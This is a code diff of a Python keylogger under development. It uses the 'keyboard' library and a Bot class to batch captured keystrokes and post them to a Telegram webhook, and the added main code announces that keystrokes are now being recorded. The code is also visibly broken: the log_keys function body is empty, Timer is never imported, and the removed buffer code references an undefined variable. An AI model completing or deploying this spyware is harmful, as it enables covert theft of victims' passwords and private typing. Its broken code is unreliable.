@@ -1,28 +1,9 @@
 import yaml
 import requests
 import logging
+from logger import Logger
+import keyboard
 
-class Logger:
-	def __init__(self,logfile):
-		self.logger = logging.getLogger(__name__)
-		logging.basicConfig(filename=logfile, encoding="utf-8", level=logging.DEBUG)
-
-
-	def info(self,message):
-		self.logger.info(message)
-		return True
-
-	def error(self,message):
-		self.logger.error(message)
-		return True
-
-	def warning(self,message):
-		self.logger.warning(message)
-		return True
-
-	def debug(self,message):
-		self.logger.debug(message)
-		return True
 
 class Bot:
 	def __init__(self):
@@ -56,31 +37,8 @@ class Bot:
 		if response.status_code != 200:
 			print(f"**A {response.status_code} ERROR OCCURED**: {response.text}")
 
-
-
-class Buffer:
-	def __init__(self,max_size):
-		self.max_size = max_size
-		self.buffer = []
-		self.end_ptr = 0
-
-	def add_to_buffer(self,data):
-		if self.end_ptr != max_size:
-			self.buffer[self.end_ptr] = data
-			self.end_ptr += 1
-		else:
-			return
-
-	def flush_buffer(self,bot):
-		# detects a key press. every 5 seconds, each key press is flushed into one string and then sent to the telegram webhook
-		# during flush, nothing cannnot be added to queue.
-		
-		total_string = "".join(self.buffer)
-		self.buffer = []
-		self.end_ptr = 0
-		bot.send_message(total_string)
-		print("logged keystrokes")
-		return
+def log_keys(bot):
+	
 
 
 def main():
@@ -88,7 +46,6 @@ def main():
 	
 	# initialized everything
 	bot = Bot()
-	buffer = Buffer(300)
 	logger = Logger("events.log")
 
 	#logs start message
@@ -97,6 +54,10 @@ def main():
 
 	
 	# starts the logger/keystroke recorder
+	bot.send_message("Keystrokes now being recorded")
+	logger.info("ks on")
+	t = Timer(5.0, log_keys, args=bot)
+	t.start()
 	
 
 	pass
